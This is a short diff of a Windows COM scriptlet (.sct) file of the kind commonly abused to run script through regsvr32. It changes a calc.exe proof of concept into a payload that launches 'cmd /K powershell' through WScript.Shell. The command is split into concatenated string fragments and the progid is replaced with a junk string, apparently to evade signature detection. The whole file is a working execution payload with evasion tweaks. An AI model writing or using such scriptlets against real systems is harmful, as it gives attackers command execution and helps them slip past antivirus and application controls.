@@ -1,15 +1,20 @@
 <?XML version="1.0"?>
 <scriptlet>
-<registration 
-    progid="CyberGym"
-    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
-	<script language="JScript">
+<registration progid="CmYhaowiefqwegpiqw+aiwehfiawephfaushd+awpoiehfpiawuhefhawepihfpiauwefuhawoiuehf">
+	<script language="JavaScript">
 		<![CDATA[
 	
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
+			var hh = "cm";
+			var h0 = "d";
+			var h1 = " /K";
+			var h2 = " powershell";
+
+			var v1 = "WScript.Shell";
+			var r = new ActiveXObject(v1).Run(hh+h0+h1+h2);	
 	
 		]]>
 </script>
 </registration>
 </scriptlet>
+
 
